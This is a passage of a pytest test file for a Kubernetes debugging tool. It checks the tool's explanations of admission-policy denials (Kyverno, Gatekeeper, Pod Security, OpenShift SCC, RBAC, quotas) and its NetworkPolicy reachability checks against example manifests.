"""Policy debugging: admission denials explained policy by policy, and NetworkPolicy reachability."""

from __future__ import annotations

import copy
import json
import re
from pathlib import Path
from typing import Any

import pytest
import yaml

from kube_noob.audit.engine import analyze
from kube_noob.cli import main
from kube_noob.config import Settings, load_settings
from kube_noob.debug.netpol import Inventory, check_reachability, inventory_from_cluster, selector_matches
from kube_noob.debug.policy import explain, parse_quantity
from kube_noob.debug.steps import classify_step
from kube_noob.errors import ClusterAccessError
from kube_noob.toolkit import NetpolCheckIn, PolicyExplainIn, Toolkit, TrafficIn

ROOT = Path(__file__).resolve().parents[1]
EXAMPLES = ROOT / "examples"

KYVERNO = """Error from server: error when creating "deploy.yaml": admission webhook "validate.kyverno.svc-fail" \
denied the request:

resource Deployment/shop/orders-api was blocked due to the following policies

disallow-latest-tag:
  autogen-validate-image-tag: 'validation error: Using a mutable image tag e.g. ''latest''
    is not allowed. rule autogen-validate-image-tag failed at path /spec/template/spec/containers/0/image/'
require-requests-limits:
  autogen-validation: 'validation error: CPU and memory resource requests and limits
    are required. rule autogen-validation failed at path /spec/template/spec/containers/0/resources/limits/'
"""

GATEKEEPER = """Error from server (Forbidden): error when creating "deploy.yaml": admission webhook \
"validation.gatekeeper.sh" denied the request: [psp-privileged-container] Privileged container is not allowed: \
nginx, securityContext: {"privileged": true}
[must-have-team] you must provide labels: {"team"}
"""

PSA = (
    'Error from server (Forbidden): error when creating "pod.yaml": pods "web" is forbidden: violates PodSecurity '
    '"restricted:latest": allowPrivilegeEscalation != false (container "web" must set '
    'securityContext.allowPrivilegeEscalation=false), unrestricted capabilities (container "web" must set '
    'securityContext.capabilities.drop=["ALL"]), runAsNonRoot != true (pod or container "web" must set '
    'securityContext.runAsNonRoot=true), seccompProfile (pod or container "web" must set '
    'securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")\n'
    "Namespace: shop\n"
)

SCC = (
    'Warning  FailedCreate  replicaset/orders-api-7c5ddbdf54  Error creating: pods "orders-api-7c5ddbdf54-" is '
    'forbidden: unable to validate against any security context constraint: [provider "anyuid": Forbidden: not '
    "usable by user or serviceaccount, provider restricted-v2: .spec.securityContext.fsGroup: Invalid value: "
    "[]int64{1000}: 1000 is not an allowed group, spec.containers[0].securityContext.runAsUser: Invalid value: 1000: "
    'must be in the ranges: [1000650000, 1000659999], provider "restricted": Forbidden: not usable by user or '
    'serviceaccount, provider "nonroot-v2": Forbidden: not usable by user or serviceaccount, provider "privileged": '
    "Forbidden: not usable by user or serviceaccount]\n"
)

RHACS = """Error from server (Failed currently enforced policies from StackRox): error when creating "deploy.yaml": \
admission webhook "policyeval.stackrox.io" denied the request:
The attempted operation violated 1 enforced policy, described below:

Policy: Latest tag
- Description:
    ↳ This policy alerts if a deployment with images using tag 'latest' is detected.
- Rationale:
    ↳ Using latest tag can result in running heterogeneous versions of code.
- Remediation:
    ↳ Consider moving to semantic versioning based on code releases (semver.org).
- Violations:
    - Container 'nginx' has image with tag 'latest'

In case of emergency, add the annotation {"admission.stackrox.io/break-glass": "ticket-1234"} to your deployment
"""

QUOTA = (
    'Error from server (Forbidden): pods "web" is forbidden: exceeded quota: compute-resources, requested: '
    "limits.cpu=2,limits.memory=2Gi, used: limits.cpu=3,limits.memory=7Gi, limited: limits.cpu=4,limits.memory=8Gi\n"
)

RBAC = (
    'Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:shop:api" cannot get resource '
    '"pods/log" in API group "" in the namespace "shop"\n'
)

VAP = (
    "The deployments \"nginx\" is invalid: : ValidatingAdmissionPolicy 'max-replicas.example.com' with binding "
    "'max-replicas-binding' denied request: failed expression: object.spec.replicas <= 5\n"
)


def _only(text: str, engine: str, platform: str | None = None) -> list[dict[str, Any]]:
    out = explain(text, platform)
    assert out["denials"], out
    assert {d["engine"] for d in out["denials"]} == {engine}, out["denials"]
    return list(out["denials"])


def test_kyverno_block_with_folded_lines_names_policy_rule_path_and_rule_ids() -> None:
    first, second = _only(KYVERNO, "kyverno")
    assert (first["policy"], first["rule"]) == ("disallow-latest-tag", "autogen-validate-image-tag")
    assert first["resource"] == "Deployment/shop/orders-api" and first["namespace"] == "shop"
    assert first["path"] == "/spec/template/spec/containers/0/image"
    assert first["message"] == "Using a mutable image tag e.g. 'latest' is not allowed."
    assert "from rule validate-image-tag" in first["meaning"]
    assert first["relatedRules"] == ["KN-S012"]
    assert second["policy"] == "require-requests-limits" and {"KN-C004", "KN-C005"} <= set(second["relatedRules"])
    commands = [s["command"] for s in first["readOnlyNextSteps"]]
    assert "kubectl get clusterpolicy disallow-latest-tag -o yaml" in commands
    assert any(c.get("needsPolicyOwner") and "PolicyException" in c["change"] for c in first["proposedChanges"])
    # The same block pasted on one line (from a log or JSON) gives the same policies and rules.
    flat = explain(" ".join(KYVERNO.split()))["denials"]
    assert [(d["policy"], d["rule"]) for d in flat] == [(d["policy"], d["rule"]) for d in (first, second)]
    assert flat[0]["message"] == first["message"]


def test_kyverno_policy_violation_event() -> None:
    (d,) = _only(
        "Warning  PolicyViolation  pod/web  policy require-run-as-nonroot/run-as-non-root fail: validation error: "
        "Running as root is not allowed. rule run-as-non-root failed at path /spec/securityContext/runAsNonRoot/",
        "kyverno",
    )
    assert (d["policy"], d["rule"], d["path"]) == (
        "require-run-as-nonroot",
        "run-as-non-root",
        "/spec/securityContext/runAsNonRoot",
    )
    assert "KN-S003" in d["relatedRules"]


def test_a_validatingpolicy_denial_gets_the_cel_crd_not_the_legacy_one() -> None:
    (d,) = _only(
        'Error from server: admission webhook "vpol.validate.kyverno.svc-fail" denied the request: Policy '
        "require-team-label failed: label 'team' is required",
        "kyverno",
    )
    assert d["policy"] == "require-team-label" and d["details"]["policyKind"] == "ValidatingPolicy"
    commands = [s["command"] for s in d["readOnlyNextSteps"]]
    assert "kubectl get validatingpolicies.policies.kyverno.io require-team-label -o yaml" in commands
    assert "kubectl get policyexceptions.policies.kyverno.io -A" in commands
    assert any(
        "PolicyException" in c["change"] and "kind: ValidatingPolicy" in c["change"] for c in d["proposedChanges"]
    )


def test_an_imagevalidatingpolicy_denial_gets_signing_fixes_not_the_generic_one() -> None:
    (d,) = _only(
        'Error from server: admission webhook "ivpol.validate.kyverno.svc-fail" denied the request: Policy '
        "verify-image-signatures failed: Image signature verification failed; verification details: failed to "
        'verify cosign signatures: no matching signatures: attestor "key" could not be verified',
        "kyverno",
    )
    assert d["policy"] == "verify-image-signatures" and d["details"]["policyKind"] == "ImageValidatingPolicy"
    commands = [s["command"] for s in d["readOnlyNextSteps"]]
    assert "kubectl get imagevalidatingpolicies.policies.kyverno.io verify-image-signatures -o yaml" in commands
    fixes = " ".join(c["change"] for c in d["proposedChanges"] if not c.get("needsPolicyOwner"))
    assert "cosign sign" in fixes
    assert "Change the object so it satisfies the rule" not in fixes


def test_a_namespaced_imagevalidatingpolicy_webhook_name_is_recognised() -> None:
    (d,) = _only(
        'admission webhook "nivpol.validate.kyverno.svc-fail" denied the request: Policy ns-verify failed: '
        "attestation missing provenance",
        "kyverno",
    )
    assert d["details"]["policyKind"] == "NamespacedImageValidatingPolicy"
    assert "attestation" in " ".join(c["change"] for c in d["proposedChanges"] if not c.get("needsPolicyOwner"))


def test_a_mutatingpolicy_denial_names_its_resource_and_explains_what_a_mutate_failure_means() -> None:
    (d,) = _only(
        'Error from server: admission webhook "mpol.validate.kyverno.svc-fail" denied the request: Resource: '
        "default/my-pod, Kind: Pod, Errors: [Policy add-sidecar: failed to evaluate mutation expression: no "
        "matching variable found for name 'request']",
        "kyverno",
    )
    assert d["policy"] == "add-sidecar" and d["details"]["policyKind"] == "MutatingPolicy"
    assert d["resource"] == "Pod/my-pod" and d["namespace"] == "default"
    assert "CEL mutate expression" in d["meaning"]
    commands = [s["command"] for s in d["readOnlyNextSteps"]]
    assert "kubectl get mutatingpolicies.policies.kyverno.io add-sidecar -o yaml" in commands
    fixes = " ".join(c["change"] for c in d["proposedChanges"] if not c.get("needsPolicyOwner"))
    assert "matchConditions" in fixes
    assert "Change the object so it satisfies the rule" not in fixes


def test_a_mutatingpolicy_denial_with_two_failing_policies_splits_into_two() -> None:
    out = explain(
        'admission webhook "nmpol.validate.kyverno.svc-fail" denied the request: Resource: team-a/web, Kind: '
        "Deployment, Errors: [Policy inject-env: bad expr, Policy add-label: missing field]"
    )
    policies = [d["policy"] for d in out["denials"]]
    assert policies == ["inject-env", "add-label"], out["denials"]
    assert all(d["details"]["policyKind"] == "NamespacedMutatingPolicy" for d in out["denials"])


def test_a_deletingpolicy_has_no_admission_webhook_so_nothing_to_explain() -> None:
    # DeletingPolicy is a background cleanup controller (runs on a cron schedule, deletes matching resources),
    # never an admission webhook -- there is no "denied the request" message for it to produce. Confirmed against
    # kyverno/kyverno's own docs and its pkg/config/config.go webhook-name constants (no DeletingPolicy entry).
    out = explain("my DeletingPolicy keeps deleting resources I didn't expect it to touch")
    assert out["denials"] == [] and "note" in out


def test_an_unmodelled_cel_webhook_name_still_falls_back_instead_of_crashing() -> None:
    (d,) = _only(
        'admission webhook "gpol.validate.kyverno.svc-fail" denied the request: Policy gen-configmap failed: '
        "some generate error",
        "kyverno",
    )
    assert d["policy"] == "gen-configmap" and "policyKind" not in d.get("details", {})


def test_gatekeeper_lists_each_constraint_and_warn_mode() -> None:
    priv, team = _only(GATEKEEPER, "gatekeeper")
    assert priv["policy"] == "psp-privileged-container" and priv["relatedRules"] == ["KN-S001"]
    assert team["policy"] == "must-have-team" and "labels" in team["proposedChanges"][0]["change"]
    assert "--field-selector metadata.name=must-have-team" in team["readOnlyNextSteps"][0]["command"]
    (warn,) = _only(
        'Warning: [must-have-team] you must provide labels: {"team"}\nnamespace/demo created\ngatekeeper', "gatekeeper"
    )
    assert warn["mode"] == "warn" and "was admitted" in warn["meaning"]


def test_validating_admission_policy_deny_and_warn() -> None:
    (d,) = _only(VAP, "validating-admission-policy")
    assert (d["policy"], d["rule"]) == ("max-replicas.example.com", "max-replicas-binding")
    assert d["resource"] == "deployments/nginx"
    assert d["details"]["failedExpression"] == "object.spec.replicas <= 5"
    assert "kubectl get validatingadmissionpolicybinding max-replicas-binding -o yaml" in [
        s["command"] for s in d["readOnlyNextSteps"]
    ]
    (w,) = _only(
        "Warning: Validation failed for ValidatingAdmissionPolicy 'max-replicas.example.com' with binding "
        "'max-replicas-binding': failed expression: object.spec.replicas <= 5",
        "validating-admission-policy",
    )
    assert w["mode"] == "warn"


def test_pod_security_patch_clears_the_same_audit_findings() -> None:
    (d,) = _only(PSA, "pod-security")
    assert d["policy"] == "restricted:latest" and d["namespace"] == "shop" and d["resource"] == "Pod/web"
    assert [v["check"] for v in d["details"]["violations"]] == [
        "allowPrivilegeEscalation != false",
        "unrestricted capabilities",
        "runAsNonRoot != true",
        "seccompProfile",
    ]
    assert set(d["relatedRules"]) == {"KN-S002", "KN-S006", "KN-S003", "KN-S008"}
    pod = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": "web", "namespace": "shop"},
        "spec": {"containers": [{"name": "web", "image": "registry.example.com/web:1.0"}]},
    }
    before = {f["ruleId"] for f in analyze(yaml.safe_dump(pod), "kubernetes", None).as_dict()["findings"]}
    assert {"KN-S002", "KN-S006", "KN-S008"} <= before
    patch = yaml.safe_load(d["patch"])["spec"]
    fixed = copy.deepcopy(pod)
    fixed["spec"]["securityContext"] = patch["securityContext"]
    fixed["spec"]["containers"][0]["securityContext"] = patch["containers"][0]["securityContext"]
    after = {f["ruleId"] for f in analyze(yaml.safe_dump(fixed), "kubernetes", None).as_dict()["findings"]}
    assert not {"KN-S002", "KN-S006", "KN-S008"} & after
    warn = explain(PSA.replace("violates PodSecurity", "would violate PodSecurity"))["denials"][0]
    assert warn["mode"] == "warn" and "FailedCreate" in warn["meaning"]


def test_scc_names_the_fields_restricted_v2_rejected_and_the_uid_range() -> None:
    (d,) = _only(SCC, "openshift-scc")
    assert d["policy"] == "restricted-v2"
    assert d["details"]["namespaceUidRange"] == "1000650000-1000659999"
    assert d["details"]["notUsableByServiceAccount"] == ["anyuid", "restricted", "nonroot-v2", "privileged"]
    fields = [e["field"] for e in d["details"]["triedProviders"]["restricted-v2"]]
    assert fields == ["spec.securityContext.fsGroup", "spec.containers[0].securityContext.runAsUser"]
    assert d["relatedRules"] == ["KN-S004"]
    assert any("[1000650000-1000659999]" in c["change"] for c in d["proposedChanges"])
    assert all(s["command"].startswith(("oc ", "kube-noob ")) for s in d["readOnlyNextSteps"])
    shipped = explain((EXAMPLES / "events-scc.txt").read_text())["denials"][0]
    assert (
        shipped["engine"] == "openshift-scc" and shipped["namespace"] == "shop" and "KN-S004" in shipped["relatedRules"]
    )


def test_rhacs_policy_maps_to_audit_rules_and_keeps_the_remediation() -> None:
    (d,) = _only(RHACS, "rhacs")
    assert d["policy"] == "Latest tag" and "KN-S012" in d["relatedRules"]
    assert d["message"] == "Container 'nginx' has image with tag 'latest'"
    assert d["proposedChanges"][0]["change"].startswith("Consider moving to semantic versioning")
    assert any("break-glass" in c["change"] and c.get("needsPolicyOwner") for c in d["proposedChanges"])


def test_quota_and_limitrange_show_what_is_left() -> None:
    (d,) = _only(QUOTA, "resource-quota")
    assert (
        "limits.cpu: needs 2, 1 left of 4" in d["meaning"]
        and "limits.memory: needs 2Gi, 1Gi left of 8Gi" in d["meaning"]
    )
    (s,) = _only(
        'pods "web" is forbidden: failed quota: compute: must specify limits.cpu for: web; limits.memory for: web',
        "resource-quota",
    )
    assert "must set those requests and limits" in s["meaning"]
    (lr,) = _only(
        'pods "web" is forbidden: [maximum memory usage per Container is 1Gi, but limit is 2Gi, memory max limit to '
        "request ratio per Container is 2, but provided ratio is 4.000000]",
        "limit-range",
    )
    assert "maximum memory per Container is 1Gi, but the limit is 2Gi" in lr["meaning"]
    assert "must be at most 2, but it is 4" in lr["meaning"]
    assert parse_quantity("1536Mi") == (1536 * 2**20, "Mi") and parse_quantity("250m") == (0.25, "m")
    assert parse_quantity("lots") is None


def test_rbac_grant_is_exactly_the_missing_permission_and_audits_clean() -> None:
    (d,) = _only(RBAC, "rbac")
    assert d["readOnlyNextSteps"][0]["command"] == (
        "kubectl auth can-i get pods --subresource=log -n shop --as=system:serviceaccount:shop:api"
    )
    role, binding = yaml.safe_load_all(d["patch"])
    assert role["kind"] == "Role" and role["rules"] == [
        {"apiGroups": [""], "resources": ["pods/log"], "verbs": ["get"]}
    ]
    assert binding["subjects"] == [{"kind": "ServiceAccount", "name": "api", "namespace": "shop"}]
    findings = analyze(d["patch"], "kubernetes", None).as_dict()["findings"]
    assert not [f for f in findings if f["ruleId"] in {"KN-S015", "KN-S016", "KN-S017"}]
    (cluster,) = _only('User "alice" cannot list resource "nodes" in API group "" at the cluster scope', "rbac")
    kinds = [doc["kind"] for doc in yaml.safe_load_all(cluster["patch"])]
    assert kinds == ["ClusterRole", "ClusterRoleBinding"]
    (anon,) = _only('User "system:anonymous" cannot get resource "pods" in API group "" in the namespace "x"', "rbac")
    assert "patch" not in anon and "not authenticated" in anon["meaning"]


def test_every_policy_step_is_read_only_paste_safe_and_redacted() -> None:
    text = "\n".join([KYVERNO, GATEKEEPER, PSA, SCC, RHACS, QUOTA, RBAC, VAP, "password=hunter2 token: abc123"])
    out = explain(text, "openshift")
    assert {d["engine"] for d in out["denials"]} == {
        "kyverno",
        "gatekeeper",
        "pod-security",
        "openshift-scc",
        "rhacs",
        "resource-quota",
        "rbac",
        "validating-admission-policy",
    }
    for d in out["denials"]:
        for step in d.get("readOnlyNextSteps", []):
            assert classify_step(step["command"]) == "read", step
            assert " #" not in step["command"]
        assert all(c["requiresApproval"] for c in d.get("proposedChanges", []))
    blob = json.dumps(out)
    assert "hunter2" not in blob and "abc123" not in blob
    assert out["summary"].startswith("10 policies blocked this")  # 2 Kyverno and 2 Gatekeeper rules


@pytest.mark.parametrize(
    "text",
    [
        "Back-off restarting failed container web in pod web-7d9f",
        "Last State: Terminated, Reason: OOMKilled, Exit Code: 137",
        "Failed to pull image registry.example.com/web:1.0: manifest unknown",
        "0/3 nodes are available: 3 Insufficient memory.",
        "the policy says hello: nothing was denied",
    ],
)
def test_everyday_errors_are_not_policy_denials(text: str) -> None:
    out = explain(text)
    assert out["denials"] == [] and "No admission denial found" in out["note"]


def test_diagnose_carries_policy_denials(settings: Settings) -> None:
    from kube_noob.toolkit import DiagnoseIn

    kit = Toolkit(settings)
    out = kit.diagnose(DiagnoseIn(text=PSA))
    assert out["policyDenials"][0]["engine"] == "pod-security"
    assert "DBG-PSA" in [d["id"] for d in out["diagnoses"]]
    assert "policyDenials" not in kit.diagnose(DiagnoseIn(text="OOMKilled exit code 137"))
    names = {s.name for s in kit.specs()}
    assert {"explain_denial", "check_network_policy"} <= names and "cluster_check_traffic" not in names
    on = Toolkit(load_settings(overrides={"cluster": {"enabled": True}}))
    assert "cluster_check_traffic" in {s.name for s in on.specs()}
    assert kit.explain_denial(PolicyExplainIn(text=RBAC))["denials"][0]["engine"] == "rbac"


# --- NetworkPolicy reachability ----------------------------------------------------------------------------


def _shop() -> Inventory:
    return Inventory.from_yaml((EXAMPLES / "netpol-shop.yaml").read_text())


@pytest.mark.parametrize(
    ("source", "destination", "port", "verdict", "blocked"),
    [
        ("web/frontend", "shop/orders-api", 8080, "allowed", None),
        ("web/frontend", "shop/orders-api", "http", "allowed", None),
        ("web:app=frontend", "shop/orders-api", 8080, "allowed", None),
        ("web:app=other", "shop/orders-api", 8080, "denied", "ingress"),
        ("web/frontend", "shop/orders-api", 9090, "denied", "ingress"),
        ("shop/orders-api", "shop/payments", 9090, "denied", "ingress"),
        ("shop/orders-api", "shop/payments", "grpc", "denied", "ingress"),
        ("shop/payments", "203.0.113.10", 443, "denied", "egress"),
        ("shop/deployment/orders-api", "web/frontend", 8080, "denied", "egress"),
    ],
)
def test_reachability_on_the_shop_example(
    source: str, destination: str, port: int | str, verdict: str, blocked: str | None
) -> None:
    out = check_reachability(_shop(), source, destination, port)
    assert out["verdict"] == verdict, out["summary"]
    if blocked:
        assert out[blocked]["allowed"] is False
        assert out["proposedChanges"][0]["requiresApproval"] is True
    if (source, destination) == ("web/frontend", "shop/orders-api") and verdict == "allowed":
        assert out["ingress"]["reason"] == "Allowed by shop/allow-frontend, ingress rule 1."
        assert out["egress"]["isolated"] is False


def test_why_each_rule_did_not_match() -> None:
    out = check_reachability(_shop(), "web/frontend", "shop/orders-api", 9090)
    allow = next(p for p in out["ingress"]["policies"] if p["policy"] == "shop/allow-frontend")
    (rule,) = allow["rules"]
    assert rule["peerMatches"] is True and rule["portMatches"] is False
    assert rule["peer"] == "pods app=frontend in namespaces team=web" and rule["ports"] == "TCP http"
    deny = next(p for p in out["ingress"]["policies"] if p["policy"] == "shop/default-deny")
    assert deny["rules"] == [] and "denies all ingress" in deny["note"]


@pytest.mark.parametrize(
    ("source", "destination", "port"),
    [
        ("shop/orders-api", "shop/payments", 9090),
        ("web/frontend", "shop/payments", "grpc"),
        ("shop/payments", "203.0.113.10", 443),
        ("shop/payments", "web/frontend", 8080),
    ],
)
def test_the_proposed_policy_allows_exactly_that_traffic(source: str, destination: str, port: int | str) -> None:
    text = (EXAMPLES / "netpol-shop.yaml").read_text()
    before = check_reachability(Inventory.from_yaml(text), source, destination, port)
    assert before["verdict"] == "denied"
    fixes = "\n---\n".join(c["manifest"] for c in before["proposedChanges"] if "manifest" in c)
    assert analyze(fixes, "kubernetes", None).as_dict()["summary"]["counts"]["critical"] == 0
    after = check_reachability(Inventory.from_yaml(text + "\n---\n" + fixes), source, destination, port)
    assert after["verdict"] == "allowed", after["summary"]
    # ... and nothing else: the fix for one port does not open another.
    other = 1 if port != 1 else 2
    assert (
        check_reachability(Inventory.from_yaml(text + "\n---\n" + fixes), source, destination, other)["verdict"]
        == "denied"
    )


def test_selector_semantics() -> None:
    labels = {"app": "web", "tier": "front"}
    assert selector_matches({}, labels) and selector_matches({"matchLabels": {"app": "web"}}, labels)
    assert not selector_matches({"matchLabels": {"app": "api"}}, labels)
    expr = {"matchExpressions": [{"key": "tier", "operator": "In", "values": ["front", "edge"]}]}
    assert selector_matches(expr, labels)
    assert not selector_matches(
        {"matchExpressions": [{"key": "tier", "operator": "NotIn", "values": ["front"]}]}, labels
    )
    assert selector_matches({"matchExpressions": [{"key": "env", "operator": "DoesNotExist"}]}, labels)
    assert not selector_matches({"matchExpressions": [{"key": "env", "operator": "Exists"}]}, labels)
    assert not selector_matches({"matchExpressions": [{"key": "app", "operator": "Gt", "values": ["1"]}]}, labels)
    assert selector_matches({"matchLabels": {"canary": True}}, {"canary": "true"})


BASE = """
apiVersion: v1
kind: Pod
metadata: {name: a, namespace: ns1, labels: {app: a}}
spec: {containers: [{name: c, image: x:1}]}
---
apiVersion: v1
kind: Pod
metadata: {name: b, namespace: ns2, labels: {app: b}}
spec: {containers: [{name: c, image: x:1, ports: [{name: web, containerPort: 8443}]}]}
"""


def _check(policies: str, source: str = "ns1/a", destination: str = "ns2/b", port: int | str = 8443) -> dict[str, Any]:
    return check_reachability(Inventory.from_yaml(BASE + "---\n" + policies), source, destination, port)


def test_policy_details_endport_ipblock_except_and_default_policy_types() -> None:
    egress_only = """
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: out, namespace: ns1}
spec:
  podSelector: {}
  egress:
  - to: [{ipBlock: {cidr: 10.0.0.0/8, except: [10.1.0.0/16]}}]
  - to: [{namespaceSelector: {matchLabels: {kubernetes.io/metadata.name: ns2}}}]
    ports: [{protocol: TCP, port: 8000, endPort: 9000}]
"""
    # policyTypes omitted + egress rules present => the policy isolates egress (and ingress) of ns1 pods
    assert _check(egress_only)["verdict"] == "allowed"
    assert _check(egress_only, port=9443)["egress"]["allowed"] is False
    assert _check(egress_only, destination="10.2.3.4", port=22)["verdict"] == "allowed"
    assert _check(egress_only, destination="10.1.2.3", port=22)["verdict"] == "denied"
    assert _check(egress_only, destination="10.0.0.0/8", port=22)["verdict"] == "denied"  # overlaps the except
    ingress = """
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: in, namespace: ns2}
spec:
  podSelector: {matchLabels: {app: b}}
  ingress:
  - from: [{podSelector: {matchLabels: {app: a}}}]
"""
    out = _check(ingress)  # podSelector alone means "in the policy's own namespace": a is in ns1
    assert out["verdict"] == "denied" and out["ingress"]["policies"][0]["rules"][0]["peerMatches"] is False
    assert (
        _check(ingress.replace("- from: [{podSelector:", "- from: [{namespaceSelector: {}, podSelector:"))["verdict"]
        == "allowed"
    )
    named = ingress + "  - ports: [{port: web}]\n"
    assert _check(named, source="10.9.9.9")["verdict"] == "allowed"  # rule 2: any source, named port 8443
    assert _check(named, source="10.9.9.9", port=8444)["verdict"] == "denied"


def test_endpoints_and_inputs_are_checked() -> None:
    inv = _shop()
    with pytest.raises(ValueError, match="known workloads: shop/deployment/orders-api"):
        check_reachability(inv, "shop/nope", "shop/orders-api", 80)
    with pytest.raises(ValueError, match="port must be"):
        check_reachability(inv, "web/frontend", "shop/orders-api", 70000)
    with pytest.raises(ValueError, match="must be a workload in the cluster"):
        check_reachability(inv, "10.0.0.1", "10.0.0.2", 80)
    with pytest.raises(ValueError, match="TCP, UDP or SCTP"):
        check_reachability(inv, "web/frontend", "shop/orders-api", 80, "ICMP")
    assert inv.resolve("frontend").ref == "deployment/frontend"
    out = check_reachability(
        Inventory.from_yaml(
            (EXAMPLES / "netpol-shop.yaml").read_text()
            + "\n---\napiVersion: policy.networking.k8s.io/v1alpha1\nkind: AdminNetworkPolicy\nmetadata: {name: x}\n"
        ),
        "web/frontend",
        "shop/orders-api",
        "metrics",
    )
    assert out["notEvaluated"][0] == "found in the input but not evaluated: AdminNetworkPolicy/x"
    assert "named port 'metrics' is not declared" in out["warning"]
    with pytest.raises(ValueError):
        TrafficIn(source="a/b", destination="c/d", port="Not_A_Port")
    assert TrafficIn(source="a/b", destination="c/d", port="8080").port == 8080


class FakeCluster:
    name = "fake"

    def __init__(self, objects: list[dict[str, Any]], readable_namespaces: bool = True) -> None:
        self.objects = objects
        self.readable_namespaces = readable_namespaces
        self.calls: list[tuple[str, str | None, str | None]] = []

    def get(self, resource: str, name: str | None = None, namespace: str | None = None, **_: Any) -> dict[str, Any]:
        self.calls.append((resource, name, namespace))
        kind = {
            "networkpolicies": "NetworkPolicy",
            "namespaces": "Namespace",
            "deployments": "Deployment",
            "statefulsets": "StatefulSet",
            "daemonsets": "DaemonSet",
            "pods": "Pod",
            "clusternetworkpolicies": "ClusterNetworkPolicy",
            "ciliumclusterwidenetworkpolicies": "CiliumClusterwideNetworkPolicy",
            "globalnetworkpolicies": "GlobalNetworkPolicy",
            "adminnetworkpolicies": "AdminNetworkPolicy",
            "baselineadminnetworkpolicies": "BaselineAdminNetworkPolicy",
        }.get(resource)
        if kind is None:
            # What a cluster says for a kind it does not serve. This fake used to KeyError, which meant adding a
            # resource to the allowlist broke the fake rather than exercising it.
            raise ClusterAccessError(f'the server doesn\'t have a resource type "{resource}"')
        if resource == "namespaces" and not self.readable_namespaces:
            raise ClusterAccessError("namespaces is forbidden")
        hits = [
            o
            for o in self.objects
            if o["kind"] == kind
            and (name is None or o["metadata"]["name"] == name)
            and (kind == "Namespace" or namespace is None or o["metadata"].get("namespace") == namespace)
        ]
        if name is None:
            return {"items": [{k: v for k, v in o.items() if k != "kind"} for o in hits]}
        if not hits:
            raise ClusterAccessError(f"{resource} {name} not found")
        return hits[0]


def test_live_reachability_reads_only_what_it_needs() -> None:
    objects = list(yaml.safe_load_all((EXAMPLES / "netpol-shop.yaml").read_text()))
    cluster = FakeCluster(objects)
    inv = inventory_from_cluster(cluster, "web/frontend", "shop/payments")
    assert check_reachability(inv, "web/frontend", "shop/payments", 9090)["verdict"] == "denied"
    assert check_reachability(inv, "web/frontend", "shop/payments", 9090)["ingress"]["policies"][0]["policy"] == (
        "shop/default-deny"
    )
    # The cluster-scoped tiers are read once each and never per namespace. ClusterNetworkPolicy is among them: the
    # evaluator does not understand v1alpha2 yet, but reading the kind is what lets the answer say it was present
    # and not evaluated, instead of answering as though no cluster-scoped policy existed.
    cluster_scoped = {
        "clusternetworkpolicies",
        "ciliumclusterwidenetworkpolicies",
        "globalnetworkpolicies",
        "adminnetworkpolicies",
        "baselineadminnetworkpolicies",
        # Calico's own version, read once so the live answer knows whether this cluster still enforces the admin
        # tier instead of assuming OVN-Kubernetes semantics on a Calico 3.32 cluster (roadmap P9).
        "clusterinformations",
    }
    assert {c[0] for c in cluster.calls} <= {"deployments", "networkpolicies", "namespaces"} | cluster_scoped
    for plural in cluster_scoped:
        assert [c[0] for c in cluster.calls].count(plural) == 1, f"{plural} must be read once, not per namespace"
        assert all(c[2] is None for c in cluster.calls if c[0] == plural), f"{plural} must be read cluster-scoped"
    for tier in ("adminnetworkpolicies", "baselineadminnetworkpolicies"):
        reads = [c for c in cluster.calls if c[0] == tier]
        assert len(reads) == 1 and reads[0][2] is None, reads
    # Without permission to read namespaces, kubernetes.io/metadata.name still works and the gap is stated -- and
    # because shop/orders-api admits only namespaces labelled team=web, an answer from unread labels is a guess:
    # it read "denied" while web may well carry that label (G279).
    inv2 = inventory_from_cluster(FakeCluster(objects, readable_namespaces=False), "web/frontend", "shop/orders-api")
    out = check_reachability(inv2, "web/frontend", "shop/orders-api", 8080)
    assert out["verdict"] == "undetermined" and "could not read namespace" in out["notes"][0]
    assert "labels of namespace web" in out["undeterminedBy"]


def test_cli_policy_commands(capsys: pytest.CaptureFixture[str], tmp_path: Path) -> None:
    shop = str(EXAMPLES / "netpol-shop.yaml")
    assert (
        main(["policy", "reach", "--from", "web/frontend", "--to", "shop/orders-api", "--port", "8080", "-f", shop])
        == 0
    )
    assert capsys.readouterr().out.startswith("ALLOWED  web/deployment/frontend -> shop/deployment/orders-api")
    rc = main(["policy", "reach", "--from", "shop/orders-api", "--to", "shop/payments", "--port", "9090", "-f", shop])
    text = capsys.readouterr().out
    assert rc == 1 and "fix (needs approval)" in text and "allow-orders-api-to-payments-9090" in text
    assert main(["--format", "json", "policy", "explain", PSA]) == 0
    assert json.loads(capsys.readouterr().out)["denials"][0]["engine"] == "pod-security"
    denial = tmp_path / "denied.txt"
    denial.write_text(SCC)
    assert main(["policy", "explain", "-f", str(denial)]) == 0
    printed = capsys.readouterr().out
    assert printed.startswith("DENY OpenShift SecurityContextConstraints  restricted-v2")
    assert "caught before deploy by: KN-S004" in printed
    assert main(["policy", "reach", "--from", "a/b", "--to", "c/d", "--port", "80"]) == 2
    assert main(["policy", "reach", "--from", "a/b", "--to", "c/d", "--port", "80", "--live"]) == 2
    kit = Toolkit(load_settings())
    out = kit.check_network_policy(
        NetpolCheckIn(
            manifests=(EXAMPLES / "netpol-shop.yaml").read_text(),
            source="web/frontend",
            destination="shop/orders-api",
            port=8080,
            platform="openshift",
        )
    )
    assert "oc get adminnetworkpolicy,baselineadminnetworkpolicy,clusternetworkpolicy" in [
        s["command"] for s in out["readOnlyNextSteps"]
    ]


def test_live_tool_and_cli_read_the_cluster(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    objects = list(yaml.safe_load_all((EXAMPLES / "netpol-shop.yaml").read_text()))
    monkeypatch.setattr("kube_noob.toolkit.get_backend", lambda _settings: FakeCluster(objects))
    kit = Toolkit(load_settings(overrides={"cluster": {"enabled": True}}))
    out = kit.cluster_check_traffic(
        TrafficIn(source="web/frontend", destination="shop/orders-api", port="http", platform="openshift")
    )
    assert out["verdict"] == "allowed" and out["readFrom"] == "live cluster via fake (read-only)"
    assert "oc get egressfirewall -n web -o yaml" in [s["command"] for s in out["readOnlyNextSteps"]]
    rc = main(
        ["--cluster-enabled", "policy", "reach", "--from", "shop/orders-api", "--to", "shop/payments", "--port", "9090"]
